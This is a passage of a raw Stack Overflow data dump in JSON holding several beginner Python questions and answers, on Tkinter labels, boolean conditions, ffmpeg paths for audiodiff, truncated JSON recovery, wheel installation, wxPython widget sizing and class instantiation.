"jenko_cp", "link": "https://stackoverflow.com/users/2014709/jenko-cp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "accepted_answer_id": 29403226, "answer_count": 2, "score": -1, "last_activity_date": 1428636074, "creation_date": 1427923227, "question_id": 29401059, "link": "https://stackoverflow.com/questions/29401059/label-and-value-display", "title": "Label and value display", "body": "<p>I'm using a simple code that displays the square root of a number in a label, but for some reason the values get overlaped in a way that I couldn't avoid it, which means that, if I use it for a number that has a exact square root, then the answer goes messed up with the previous answer of many digits.</p>\n\n<p>I've been use the next code so far:</p>\n\n<pre><code>from Tkinter import *\n\ndef square_calc():\n    x = x_val.get()\n    sqx = x ** 0.5\n    print x, \"** 0.5 =\", sqx\n    sqx_txt = Label(root, text = \"x ** 0.5 =\").grid(row=3, column=0)\n    sqx_lab = Label(root, text = sqx).grid(row=3, column=1)\n\nroot = Tk()\nroot.title(\"Calculating square root\")\n\nx_val = DoubleVar()\n\nx_lab   = Label(root, text = \"x\").grid(row=0, column=0)\nnmb     = Entry(root, textvariable = x_val).grid(row=0, column=1)\ncalc    = Button(root, text = \"Calculate\", command=square_calc).grid(columnspan=2)\ny_lab   = Label(root, text = \" \").grid(row=3, column=0)\n\nroot.mainloop()\n</code></pre>\n"}, {"tags": ["python", "math"], "comments": [{"owner": {"reputation": 21133, "user_id": 1084416, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/RLhZZ.jpg?s=128&g=1", "display_name": "Peter Wood", "link": "https://stackoverflow.com/users/1084416/peter-wood"}, "edited": false, "score": 0, "creation_date": 1427923453, "post_id": 29401045, "comment_id": 46977900, "body": "Try typing <code>&#39;n&#39; == &#39;y&#39; or &#39;Y&#39;</code> in the console"}], "answers": [{"tags": [], "owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "is_accepted": true, "score": 0, "last_activity_date": 1427923490, "creation_date": 1427923490, "answer_id": 29401121, "question_id": 29401045, "link": "https://stackoverflow.com/questions/29401045/play-again-not-working/29401121#29401121", "title": "play again not working", "body": "<p>I think your if condition is wrong.\nIt can either be:</p>\n\n<pre><code>if again=='y' or again=='Y':\n</code></pre>\n\n<p>or</p>\n\n<pre><code>if again in ['Y', 'y']:\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6178, "user_id": 4420934, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a512a390a9af72bcac92dcb903e5cdeb?s=128&d=identicon&r=PG&f=1", "display_name": "syntonym", "link": "https://stackoverflow.com/users/4420934/syntonym"}, "is_accepted": false, "score": 0, "last_activity_date": 1427923491, "creation_date": 1427923491, "answer_id": 29401122, "question_id": 29401045, "link": "https://stackoverflow.com/questions/29401045/play-again-not-working/29401122#29401122", "title": "play again not working", "body": "<p><code>if again== 'y' or 'Y':</code> does not do what you think it does. <code>or</code> is a boolean operator, so the following is the same: <code>if (again == 'y') or ('Y')</code>. Because chars are alwayse treated as <code>True</code> in a boolean context your if branch will alwayse execute.</p>\n"}], "owner": {"reputation": 13, "user_id": 4707340, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2e38d7358cb8dcc033834dfe90f9f4d?s=128&d=identicon&r=PG&f=1", "display_name": "Joseph Taylor", "link": "https://stackoverflow.com/users/4707340/joseph-taylor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "closed_date": 1427924574, "accepted_answer_id": 29401121, "answer_count": 2, "score": 0, "last_activity_date": 1427925200, "creation_date": 1427923186, "last_edit_date": 1427925200, "question_id": 29401045, "link": "https://stackoverflow.com/questions/29401045/play-again-not-working", "closed_reason": "Duplicate", "title": "play again not working", "body": "<p>In my code for a maths quiz when i type N when it comes up with play again it plays again when it shouldnt. Here is my code:</p>\n\n<pre><code>def play_again():\n    again= input(\"would you like to play again? y for yes and n for no\")\n    while again not in ['Y','y','N','n']:\n        again = input(\"please enter 'Y' or 'N'\")\n\n    if again== 'y' or 'Y':\n        do_the_quiz()\n    else:\n        print(\"cheers lad thanks for playing\")\n        exit()\n</code></pre>\n\n<p>can you spot something wrong in it that makes N or n play again when it shouldnt.</p>\n"}, {"tags": ["python", "linux", "terminal", "ubuntu-14.04"], "comments": [{"owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427923267, "post_id": 29401025, "comment_id": 46977813, "body": "Are you sure you&#39;re running the script from the directory containing both files?"}], "answers": [{"comments": [{"owner": {"reputation": 1829, "user_id": 2665518, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/dbcf0cd9bd017bb513dcc488ab6cdda6?s=128&d=identicon&r=PG", "display_name": "discodane", "link": "https://stackoverflow.com/users/2665518/discodane"}, "edited": false, "score": 0, "creation_date": 1427923838, "post_id": 29401093, "comment_id": 46978066, "body": "Those two lines of code is literally all the code. Just one .py file with 2 two .wav files in the same directory. I am not sure if i need to take into account where the library that I am using is stored or not."}, {"owner": {"reputation": 68601, "user_id": 315168, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fbcd3f115ce33ea2380f5a2dae0cf6d2?s=128&d=identicon&r=PG", "display_name": "Mikko Ohtamaa", "link": "https://stackoverflow.com/users/315168/mikko-ohtamaa"}, "reply_to_user": {"reputation": 1829, "user_id": 2665518, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/dbcf0cd9bd017bb513dcc488ab6cdda6?s=128&d=identicon&r=PG", "display_name": "discodane", "link": "https://stackoverflow.com/users/2665518/discodane"}, "edited": false, "score": 0, "creation_date": 1427924040, "post_id": 29401093, "comment_id": 46978150, "body": "I think the issue is that it doesn&#39;t find your ffmpeg binaries, not that it doesn&#39;t find your audio files."}, {"owner": {"reputation": 1829, "user_id": 2665518, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/dbcf0cd9bd017bb513dcc488ab6cdda6?s=128&d=identicon&r=PG", "display_name": "discodane", "link": "https://stackoverflow.com/users/2665518/discodane"}, "edited": false, "score": 0, "creation_date": 1427927545, "post_id": 29401093, "comment_id": 46979499, "body": "That makes sense. How does one configure that? meaning how do I tell it where to find the ffmpeg binaries?"}, {"owner": {"reputation": 68601, "user_id": 315168, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fbcd3f115ce33ea2380f5a2dae0cf6d2?s=128&d=identicon&r=PG", "display_name": "Mikko Ohtamaa", "link": "https://stackoverflow.com/users/315168/mikko-ohtamaa"}, "reply_to_user": {"reputation": 1829, "user_id": 2665518, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/dbcf0cd9bd017bb513dcc488ab6cdda6?s=128&d=identicon&r=PG", "display_name": "discodane", "link": "https://stackoverflow.com/users/2665518/discodane"}, "edited": false, "score": 1, "creation_date": 1427927668, "post_id": 29401093, "comment_id": 46979553, "body": "Give full path to <code>ffmpeg</code> binary, on your hard disk, in <code>ffmpeg_bin</code> variable."}], "tags": [], "owner": {"reputation": 68601, "user_id": 315168, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fbcd3f115ce33ea2380f5a2dae0cf6d2?s=128&d=identicon&r=PG", "display_name": "Mikko Ohtamaa", "link": "https://stackoverflow.com/users/315168/mikko-ohtamaa"}, "is_accepted": true, "score": 1, "last_activity_date": 1427923371, "creation_date": 1427923371, "answer_id": 29401093, "question_id": 29401025, "link": "https://stackoverflow.com/questions/29401025/errno-2-no-such-file-or-directory/29401093#29401093", "title": "errno 2: No such file or directory", "body": "<p>You can make absolute paths to the files using Python's <code>os.path</code> tools:</p>\n\n<pre><code> import os\n\n fname = os.path.join(path_to_output1, 'output1.wav')\n</code></pre>\n\n<p>If you need to grab the path at the start of the application, before you do any change directory you can do it:</p>\n\n<pre><code>path = os.getcwd()  # Get the current path where the application was started\n</code></pre>\n\n<p>Without knowing your full source code, directory layout and exact program invocation it is difficult to say more.</p>\n\n<p>More info:</p>\n\n<p><a href=\"https://docs.python.org/3.4/library/os.path.html?highlight=path#module-os.path\" rel=\"nofollow\">https://docs.python.org/3.4/library/os.path.html?highlight=path#module-os.path</a></p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 1634324, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SGdvS.png?s=128&g=1", "display_name": "MatiasK", "link": "https://stackoverflow.com/users/1634324/matiask"}, "is_accepted": false, "score": 0, "last_activity_date": 1427923619, "creation_date": 1427923619, "answer_id": 29401148, "question_id": 29401025, "link": "https://stackoverflow.com/questions/29401025/errno-2-no-such-file-or-directory/29401148#29401148", "title": "errno 2: No such file or directory", "body": "<p>Did you check the dependencies for audiodiff?</p>\n\n<blockquote>\n  <p>audiodiff requires FFmpeg to be installed in your system. The path is ffmpeg by default, but you can change it by following ways (later rules take precedence over earlier ones).</p>\n  \n  <ol>\n  <li>audiodiff.FFMPEG_BIN module property </li>\n  <li>FFMPEG_BIN environment variable </li>\n  <li>ffmpeg_bin flag (commandline tool only)</li>\n  </ol>\n</blockquote>\n"}], "owner": {"reputation": 1829, "user_id": 2665518, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/dbcf0cd9bd017bb513dcc488ab6cdda6?s=128&d=identicon&r=PG", "display_name": "discodane", "link": "https://stackoverflow.com/users/2665518/discodane"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1388, "favorite_count": 0, "accepted_answer_id": 29401093, "answer_count": 2, "score": 1, "last_activity_date": 1427923619, "creation_date": 1427923113, "question_id": 29401025, "link": "https://stackoverflow.com/questions/29401025/errno-2-no-such-file-or-directory", "title": "errno 2: No such file or directory", "body": "<p>I've seen multiple threads with this issue but I can't find one that applies to my situation. I'm using a library called audiodiff that essentially tells you whether or not two audio files have the same content. I have recorded 2 .wav files previously saved that I want to check. Here is the code:</p>\n\n<pre><code>import audiodiff\nprint audiodiff.audio_equal('output1.wav', 'output2.wav', ffmpeg_bin=None)\n</code></pre>\n\n<p>Here is the output I'm getting in the terminal when I run it:</p>\n\n<pre><code>File \"/usr/local/lib/python2.7/dist-packages/audiodiff/__init__.py\", line 51, in audio_equal\nreturn checksum(name1, ffmpeg_bin) == checksum(name2, ffmpeg_bin)\nFile \"/usr/local/lib/python2.7/dist-packages/audiodiff/__init__.py\", line 86, in checksum\nstderr=subprocess.PIPE)\nFile \"/usr/lib/python2.7/subprocess.py\", line 710, in __init__\nerrread, errwrite)\nFile \"/usr/lib/python2.7/subprocess.py\", line 1327, in _execute_child\nraise child_exception\n</code></pre>\n\n<p>The explanations I've seen on here have something to do with the cd, but all of my files are in the same folder. So, I'm not sure how that applies. Any insight on this would be awesome. TIA.</p>\n"}, {"tags": ["python", "json"], "comments": [{"owner": {"reputation": 11204, "user_id": 1236217, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vZwn9.png?s=128&g=1", "display_name": "Namphibian", "link": "https://stackoverflow.com/users/1236217/namphibian"}, "edited": false, "score": 0, "creation_date": 1427923083, "post_id": 29400995, "comment_id": 46977729, "body": "Can you process some of them?"}, {"owner": {"reputation": 1225, "user_id": 2709026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f838e0a64520b2ec72153bfefe68aeb6?s=128&d=identicon&r=PG&f=1", "display_name": "tzima", "link": "https://stackoverflow.com/users/2709026/tzima"}, "edited": false, "score": 0, "creation_date": 1427923110, "post_id": 29400995, "comment_id": 46977745, "body": "What <i>damaged</i> means? How it looks? Could you post some example?"}, {"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1427923132, "post_id": 29400995, "comment_id": 46977754, "body": "at best any such tool could just GUESS at what&#39;s missing. but the best it could do with <code>{&quot;foo&quot;:&quot;ba</code> is finish it off as <code>{&quot;foo&quot;:ba&quot;}</code>, and you&#39;d never know it was <code>{&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;qux&quot;}</code>. so yeah,,, GIGO applies. you&#39;ve got garbage for inputs. the best you can hope for is having garbage as output."}, {"owner": {"reputation": 5681, "user_id": 3040064, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/02e7081757e69605a91b7f7aea47f4ae?s=128&d=identicon&r=PG&f=1", "display_name": "Jason Hu", "link": "https://stackoverflow.com/users/3040064/jason-hu"}, "edited": false, "score": 0, "creation_date": 1427923151, "post_id": 29400995, "comment_id": 46977767, "body": "well... how can i recover something from <code>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[</code>. please offer some examples at least."}, {"owner": {"reputation": 354, "user_id": 1031327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daf96f980bdde3b2f0aa724b8ac3c066?s=128&d=identicon&r=PG", "display_name": "Jacek", "link": "https://stackoverflow.com/users/1031327/jacek"}, "edited": false, "score": 0, "creation_date": 1427923588, "post_id": 29400995, "comment_id": 46977963, "body": "I cannot post the actual files, but they are JSON responses from Instagram. If you have a look at output from the <code>&#47;media&#47;search</code> API endpoint [see: <a href=\"https://instagram.com/developer/endpoints/media/]\" rel=\"nofollow noreferrer\">instagram.com/developer/endpoints/media/]</a> and chop about 1000 characters off the beginning and about the same off the end of the response, you will get the idea of what I&#39;m dealing with."}, {"owner": {"reputation": 1225, "user_id": 2709026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f838e0a64520b2ec72153bfefe68aeb6?s=128&d=identicon&r=PG&f=1", "display_name": "tzima", "link": "https://stackoverflow.com/users/2709026/tzima"}, "edited": false, "score": 0, "creation_date": 1427923928, "post_id": 29400995, "comment_id": 46978104, "body": "That seems really bad. Just to cover all options: trying to recover the original file (from filesystem) is out of play? It&#39;s not reliable, but you may manage to recover at least some of it."}, {"owner": {"reputation": 1225, "user_id": 2709026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f838e0a64520b2ec72153bfefe68aeb6?s=128&d=identicon&r=PG&f=1", "display_name": "tzima", "link": "https://stackoverflow.com/users/2709026/tzima"}, "edited": false, "score": 0, "creation_date": 1427924187, "post_id": 29400995, "comment_id": 46978210, "body": "Do all the JSONs have the same ordering of elements? I&#39;d try to find a way to detect which parts of the JSON are missing (which would be relatively easy with the same order of elements everywhere). Then you&#39;d be able to fill some of the missing characters correctly and recover some informations..."}, {"owner": {"reputation": 354, "user_id": 1031327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daf96f980bdde3b2f0aa724b8ac3c066?s=128&d=identicon&r=PG", "display_name": "Jacek", "link": "https://stackoverflow.com/users/1031327/jacek"}, "edited": false, "score": 0, "creation_date": 1427924310, "post_id": 29400995, "comment_id": 46978262, "body": "No, recovery from the filesystem is out of question. The damage was caused by the (still broken) <code>boto</code> library [see <a href=\"https://github.com/boto/boto/issues/2207]\" rel=\"nofollow noreferrer\">github.com/boto/boto/issues/2207]</a>. Whoever was pulling data from Instagram did not properly handle uploads using  <code>set_contents_from_filename()</code> and as the result of that S3 buckets contain chopped up files. My job is to recover whatever can be recovered. I know the data schema, as it is well documented, I am looking for clues/suggestions on how to attack this problem. It is an interesting challenge."}, {"owner": {"reputation": 1225, "user_id": 2709026, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f838e0a64520b2ec72153bfefe68aeb6?s=128&d=identicon&r=PG&f=1", "display_name": "tzima", "link": "https://stackoverflow.com/users/2709026/tzima"}, "edited": false, "score": 0, "creation_date": 1427930710, "post_id": 29400995, "comment_id": 46980578, "body": "OK, I posted <i>try-to-be-an-answer</i>. It was more like a comment, but it didn&#39;t fit in here :)"}], "owner": {"reputation": 354, "user_id": 1031327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/daf96f980bdde3b2f0aa724b8ac3c066?s=128&d=identicon&r=PG", "display_name": "Jacek", "link": "https://stackoverflow.com/users/1031327/jacek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 133, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1427930623, "creation_date": 1427922989, "last_edit_date": 1427923643, "question_id": 29400995, "link": "https://stackoverflow.com/questions/29400995/how-to-automatically-parse-damaged-json-documents", "title": "How to automatically parse damaged JSON documents?", "body": "<p>I have over 3,000 JSON documents stored in truncated text files. Those documents cannot be recovered from the original source, the data is gone. I tried <code>json</code>, <code>simplejson</code>, and <code>demjson</code> to turn them into Python objects, but they all predictably failed. I'd like to recover some of the data anyway. Where should I start looking for tools to automate that process?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 45099, "user_id": 2011147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FGRgf.jpg?s=128&g=1", "display_name": "Selcuk", "link": "https://stackoverflow.com/users/2011147/selcuk"}, "edited": false, "score": 0, "creation_date": 1427922862, "post_id": 29400932, "comment_id": 46977633, "body": "What do you mean by &quot;it does not work&quot;?"}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1427924305, "post_id": 29400932, "comment_id": 46978258, "body": "You can&#39;t install <code>pygame</code> by passing the name of the <code>numpy</code> .whl file. Think about what you are doing next time you blindly run a command found on the internet."}], "answers": [{"comments": [{"owner": {"reputation": 67, "user_id": 4739986, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/26f20b43bf7c07bb08424ce01a6c3dc7?s=128&d=identicon&r=PG&f=1", "display_name": "ronald7894", "link": "https://stackoverflow.com/users/4739986/ronald7894"}, "edited": false, "score": 0, "creation_date": 1427938018, "post_id": 29401029, "comment_id": 46982415, "body": "i am sorry when i post it i copyed the wrong text, but when i used it i got an error"}], "tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 1, "last_activity_date": 1427923136, "last_edit_date": 1495535206, "creation_date": 1427923136, "answer_id": 29401029, "question_id": 29400932, "link": "https://stackoverflow.com/questions/29400932/how-to-install-whl-files-in-python-3-4-from-www-lfd-uci-edu/29401029#29401029", "title": "How to install .whl files in python 3.4 from www.lfd.uci.edu", "body": "<p>The code you tried seems suspiciously similar to the answer I gave <a href=\"https://stackoverflow.com/questions/29284282/how-to-install-in-python-3-4-whl-files/29286276#29286276\">here</a>. That command is not a magical string that does everything: it won't install <code>pygame</code> for you when you give it the name of a <code>numpy</code> .whl file. For this to work, you have to download the proper file, then use a command that includes the proper filename.</p>\n"}], "owner": {"reputation": 67, "user_id": 4739986, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/26f20b43bf7c07bb08424ce01a6c3dc7?s=128&d=identicon&r=PG&f=1", "display_name": "ronald7894", "link": "https://stackoverflow.com/users/4739986/ronald7894"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 365, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1574237401, "creation_date": 1427922716, "last_edit_date": 1574237401, "question_id": 29400932, "link": "https://stackoverflow.com/questions/29400932/how-to-install-whl-files-in-python-3-4-from-www-lfd-uci-edu", "title": "How to install .whl files in python 3.4 from www.lfd.uci.edu", "body": "<p>I tried to install pygame 3.4 from www.lfd.uci.edu\nI read someone that told me to do this <code>C:\\Python34\\Scripts\\pip3.4.exe</code> install <code>C:\\Users\\tomer2\\Desktop\\pygame+mkl\u2011cp34\u2011none\u2011win_amd64.whl</code></p>\n\n<p>but it does not work.</p>\n"}, {"tags": ["python", "wxpython"], "comments": [{"owner": {"reputation": 3460, "user_id": 2216870, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wiK4i.jpg?s=128&g=1", "display_name": "Yoriz", "link": "https://stackoverflow.com/users/2216870/yoriz"}, "edited": false, "score": 0, "creation_date": 1427923549, "post_id": 29400890, "comment_id": 46977944, "body": "Would it be possible for you to change your code to the minimum amount of code that shows the problem that is runnable including a frame, mainloop ect."}], "answers": [{"tags": [], "owner": {"reputation": 5783, "user_id": 395984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/57d4a16205f08542f455a3f1a15ab2ce?s=128&d=identicon&r=PG", "display_name": "RobinDunn", "link": "https://stackoverflow.com/users/395984/robindunn"}, "is_accepted": true, "score": 0, "last_activity_date": 1428000137, "creation_date": 1428000137, "answer_id": 29420169, "question_id": 29400890, "link": "https://stackoverflow.com/questions/29400890/wxpython-weird-bug-for-txtctrl-box-is-being-clipped/29420169#29420169", "title": "wxpython weird bug for TxtCtrl: box is being &quot;clipped&quot;", "body": "<p>Try replacing the vertical size of the textctrl with -1, so wx will use the default best size for the height of the widget.  If I remember correctly the normal height of single line textctrls on Windows is about 23 pixels, so using 20 will not give it enough room to draw itself the way it wants to.</p>\n"}], "owner": {"reputation": 781, "user_id": 4696214, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/bea909dd9b61ea4c4f79192fb97d3f1f?s=128&d=identicon&r=PG&f=1", "display_name": "ohbrobig", "link": "https://stackoverflow.com/users/4696214/ohbrobig"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "accepted_answer_id": 29420169, "answer_count": 1, "score": 0, "last_activity_date": 1428000137, "creation_date": 1427922553, "question_id": 29400890, "link": "https://stackoverflow.com/questions/29400890/wxpython-weird-bug-for-txtctrl-box-is-being-clipped", "title": "wxpython weird bug for TxtCtrl: box is being &quot;clipped&quot;", "body": "<p>When I run the program on Windows, initially I get this weird bug: </p>\n\n<p><img src=\"https://i.stack.imgur.com/6LCY8.jpg\" alt=\"enter image description here\"></p>\n\n<p>As you can see the textbox overlaps the border. However, when I click on the box it fixes itself...didn't see this problem when I ran on mac.</p>\n\n<p>Here is my code :</p>\n\n<pre><code>    panel = wx.Panel(self, wx.ID_ANY)\n\n    self.currentDirectory = os.getcwd()\n\n    menuBar = wx.MenuBar()\n    fileMenu = wx.Menu()\n\n    self.pathBox = wx.TextCtrl(panel, pos=(260, 70), size=(240, 20))\n\n    openFileBtn = wx.Button(panel, label=\"Select Input File\", pos=(340, 40))\n    openFileBtn.Bind(wx.EVT_BUTTON, self.onOpenFile)\n    onGo = wx.Button(panel,label=\"GO!\", pos=(340,220))\n    setbold = wx.Font(18, wx.DEFAULT, wx.ITALIC, wx.BOLD)\n    onGo.SetFont(setbold)\n    self.Bind(wx.EVT_BUTTON, self.onGo)\n</code></pre>\n"}, {"tags": ["python", "class", "methods"], "comments": [{"owner": {"reputation": 253, "user_id": 4505245, "user_type": "registered", "accept_rate": 39, "profile_image": "https://graph.facebook.com/1230173622/picture?type=large", "display_name": "holaprofesor", "link": "https://stackoverflow.com/users/4505245/holaprofesor"}, "edited": false, "score": 0, "creation_date": 1427931964, "post_id": 29400797, "comment_id": 46980933, "body": "we&#39;re in the same class i think and i got the same problem that you had... did their answers fix the problem? because they didnt fix mine"}, {"owner": {"reputation": 45099, "user_id": 2011147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FGRgf.jpg?s=128&g=1", "display_name": "Selcuk", "link": "https://stackoverflow.com/users/2011147/selcuk"}, "reply_to_user": {"reputation": 253, "user_id": 4505245, "user_type": "registered", "accept_rate": 39, "profile_image": "https://graph.facebook.com/1230173622/picture?type=large", "display_name": "holaprofesor", "link": "https://stackoverflow.com/users/4505245/holaprofesor"}, "edited": false, "score": 0, "creation_date": 1427973208, "post_id": 29400797, "comment_id": 46996016, "body": "@JaredBanton Why don&#39;t you ask your own question then?"}], "answers": [{"comments": [{"owner": {"reputation": 173, "user_id": 4696281, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/a50581e595208119bb51b3ebebabd226?s=128&d=identicon&r=PG&f=1", "display_name": "Brett", "link": "https://stackoverflow.com/users/4696281/brett"}, "edited": false, "score": 0, "creation_date": 1427922739, "post_id": 29400855, "comment_id": 46977585, "body": "When I change the script to yours, I receive a type error &#39;Dot&#39; object does not support indexing. Any idea why this is occurring?"}], "tags": [], "owner": {"reputation": 45099, "user_id": 2011147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FGRgf.jpg?s=128&g=1", "display_name": "Selcuk", "link": "https://stackoverflow.com/users/2011147/selcuk"}, "is_accepted": false, "score": 3, "last_activity_date": 1427922443, "creation_date": 1427922443, "answer_id": 29400855, "question_id": 29400797, "link": "https://stackoverflow.com/questions/29400797/using-methods-in-a-defined-class/29400855#29400855", "title": "Using Methods in a Defined Class", "body": "<p>You never instantiate a <code>Dot</code> object, you create a tuple with 3 elements. Change it to:</p>\n\n<pre><code>point1 = Dot(2,3,\"red\")\npoint2 = Dot(1,2,\"blue\")\n</code></pre>\n\n<p>and instead of</p>\n\n<pre><code>print(\"Creates a\" + \" \" + str(point1[2]) + \" \" + \"dot with coordinates (\" + str(point1[0]) + \",\" + str(point1[1]) + \")\")\n</code></pre>\n\n<p>use</p>\n\n<pre><code>print \"Creates a\" + \" \" + point1.C + \" \" + \"dot with coordinates (\" + str(point1.X) + \",\" + str(point1.Y) + \")\"\n</code></pre>\n\n<p>By the way, the <code>.format()</code> syntax is much more clear:</p>\n\n<pre><code>print \"Creates a {0} dot with coordinates ({1}, {2})\".format(point1.C, point1.X, point1.Y)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 40039, "user_id": 699224, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/4feb08afcd7c57acb72bd49fc2bf834d?s=128&d=identicon&r=PG", "display_name": "DNA", "link": "https://stackoverflow.com/users/699224/dna"}, "is_accepted": false, "score": 0, "last_activity_date": 1427922482, "creation_date": 1427922482, "answer_id": 29400867, "question_id": 29400797, "link": "https://stackoverflow.com/questions/29400797/using-methods-in-a-defined-class/29400867#29400867", "title": "Using Methods in a Defined Class", "body": "<p>Your code:</p>\n\n<pre><code>point1 = (2,3,\"red\")\n</code></pre>\n\n<p>does not create an instance of your Dot class - it just creates a <a href=\"https://docs.python.org/2/tutorial/datastructures.html#tuples-and-sequences\" rel=\"nofollow\">tuple</a>.</p>\n\n<p>To create a Dot, you have to call its constructor (<code>__init__</code>), i.e:</p>\n\n<pre><code>point1 = Dot(2,3,\"red\")\n</code></pre>\n"}], "owner": {"reputation": 173, "user_id": 4696281, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/a50581e595208119bb51b3ebebabd226?s=128&d=identicon&r=PG&f=1", "display_name": "Brett", "link": "https://stackoverflow.com/users/4696281/brett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1427922482, "creation_date": 1427922238, "last_edit_date": 1427922388, "question_id": 29400797, "link": "https://stackoverflow.com/questions/29400797/using-methods-in-a-defined-class", "title": "Using Methods in a Defined Class", "body": "<p>I am trying to make a script in which I am supposed to make a class Dot, which takes a X position, a Y position, and Color. I have made the class and all of the methods to go with it. The problem I am running into is how to apply the method. Here is what I have done:</p>\n\n<pre><code>class Dot:\n    '''A class that stores information about a dot on a flat grid\n       attributes: X (int) Y (int), C (str)'''\n\n    def __init__(self, xposition, yposition, color):\n        '''xposition represents the x cooridinate, yposition represents\n           y coordinate and color represent the color of the dot'''\n        self.X = xposition\n        self.Y = yposition\n        self.C = color\n\n\n    def __str__(self):\n        \"Creates a string for appropiate display to represent a point\"\n        return str(self.X) + \" \" + str(self.Y) + \" \" + str(self.C)\n\n    def move_up(self,number):\n        '''Takes an integer and modifies the point by adding the given\n           number to the x-coordinate\n           attributes: number (int)'''\n\n        self.Y = number + self.Y\n\n    def move_right(self,number):\n        '''Takes an integer and modifies the Point by adding the given number to the y-coordinate\n           attributes: number (int)'''\n\n        self.X = number + self.X\n\n    def distance_to(point2):\n        '''Takes another Dot and returns the distance to that second Dot\n           attributes: X (int) Y (int)'''\n\n        distance = ((self.X - point2.X )**2) + ((self.Y - point2.Y)**2)\n        real_distance = distance.sqrt(2)\n\n        return real_distance\n\n\n\npoint1 = (2,3,\"red\")\nprint(\"Creates a\" + \" \" + str(point1[2]) + \" \" + \"dot with coordinates (\" + str(point1[0]) + \",\" + str(point1[1]) + \")\")\npoint2 = (1,2,\"blue\")\nprint(\"Creates a\" + \" \" + str(point2[2]) + \" \" + \"dot with coordinates (\" + str(point2[0]) + \",\" + str(point2[1]) + \")\")\nnew_point = point1.move_up(3)\nprint(\"Moves point up three on the y axis\")\n</code></pre>\n\n<p>Here is what is returned:</p>\n\n<pre><code>AttributeError: 'tuple' object has no attribute 'move_up'\n</code></pre>\n"}, {"tags": 